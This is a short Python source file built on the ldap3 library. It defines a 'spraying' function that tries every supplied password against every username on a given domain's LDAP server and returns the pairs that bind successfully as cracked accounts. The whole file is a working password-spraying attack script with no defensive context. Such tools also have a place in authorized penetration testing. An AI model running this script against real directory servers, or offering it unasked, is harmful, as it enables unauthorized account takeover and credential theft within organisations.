from ldap3 import Connection, ALL

def spraying(passwords,usernames,domain,server):
    accounts_cracked = []
    for user in usernames:
        for pwd in passwords: 
            try:
                Connection(server, user+"@"+domain, pwd, auto_bind=True)
            except Exception as e:
                pass
            else:
                accounts_cracked.append(user+" "+pwd)
    return accounts_cracked
